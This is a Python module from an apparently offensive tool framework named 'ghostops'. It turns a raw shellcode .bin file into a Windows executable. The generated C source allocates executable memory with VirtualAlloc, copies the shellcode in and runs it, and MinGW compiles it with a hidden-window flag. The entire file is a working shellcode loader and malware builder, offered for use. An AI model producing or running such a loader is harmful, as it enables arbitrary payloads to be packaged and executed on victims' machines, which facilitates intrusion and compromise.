import subprocess
from pathlib import Path
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger


class WindowsShellcodeExecuter(BaseModule):
    """
    Module that injects raw shellcode from a .bin file and executes it in memory.
    """

    module_name = "WindowsShellcodeExecuter"
    module_description = (
        "Injects raw shellcode from a .bin file and executes it in memory."
    )
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "execute"
    module_target_os = ["windows"]
    module_target_architecture = ["x86", "x64"]

    @staticmethod
    def add_arguments(parser) -> None:
        """
        Define module-specific command line arguments.

        Args:
            parser (argparse.ArgumentParser): Argument parser instance.
        """
        parser.add_argument(
            "--payload",
            required=True,
            help="Path to raw shellcode binary file (e.g., ghostops.bin)",
        )
        parser.add_argument(
            "--arch",
            choices=["x86", "x64"],
            required=True,
            help="Target architecture for the executable",
        )
        parser.add_argument(
            "--output",
            required=True,
            help="Output filename for the compiled executable (e.g., ghostops.exe)",
        )

    @staticmethod
    def generate_c_source(shellcode: bytes) -> str:
        """
        Generate C source code that executes the provided raw shellcode.

        Args:
            shellcode (bytes): Raw shellcode bytes.

        Returns:
            str: C source code as a string.
        """
        shellcode_c_array = WindowsShellcodeExecuter.format_bytes_for_c(shellcode)

        return f"""
#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = {{ {shellcode_c_array} }};
unsigned int shellcode_len = sizeof(shellcode);

int main() {{
    void *exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {{
        fprintf(stderr, "Memory allocation failed.\\n");
        return -1;
    }}
    memcpy(exec_mem, shellcode, shellcode_len);
    ((void(*)())exec_mem)();
    return 0;
}}
"""

    @staticmethod
    def format_bytes_for_c(data: bytes) -> str:
        """
        Format bytes as comma-separated hex values for C array initialization.

        Args:
            data (bytes): Byte data to format.

        Returns:
            str: Formatted string for C source.
        """
        return ",".join(f"0x{b:02x}" for b in data)

    @staticmethod
    def compile_c_code(source_file: Path, output_exe: Path, arch: str) -> None:
        """
        Compile the generated C source file to a Windows executable.

        Args:
            source_file (Path): Path to the C source file.
            output_exe (Path): Path for the output executable.
            arch (str): Target architecture, either 'x86' or 'x64'.
        """
        compiler = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
        flags = ["-mwindows"] if arch == "x64" else ["-m32", "-mwindows"]

        try:
            subprocess.run(
                [compiler, str(source_file), "-o", str(output_exe)] + flags, check=True
            )
            Logger.log("good", f"Executable compiled successfully: {output_exe}")
        except subprocess.CalledProcessError as e:
            Logger.log("flaw", f"GCC compilation failed: {e}")

    @staticmethod
    def main(args) -> None:
        """
        Main execution logic of the module.

        Steps:
        - Validates payload file
        - Reads shellcode bytes
        - Generates C source code with the raw shellcode
        - Writes C source to disk
        - Compiles C source into Windows executable

        Args:
            args: Parsed command-line arguments.
        """
        payload_path = Path(args.payload)
        output_path = Path(args.output)

        if not payload_path.exists() or payload_path.suffix.lower() != ".bin":
            Logger.log("flaw", "Payload must be a valid .bin file")
            return

        try:
            shellcode = payload_path.read_bytes()
            Logger.log("info", f"Read {len(shellcode)} bytes from {payload_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to read payload file: {e}")
            return

        c_source_path = output_path.with_suffix(".c")

        try:
            c_source = WindowsShellcodeExecuter.generate_c_source(shellcode)
            c_source_path.write_text(c_source)
            Logger.log("good", f"C source written to: {c_source_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write C source: {e}")
            return

        WindowsShellcodeExecuter.compile_c_code(c_source_path, output_path, args.arch)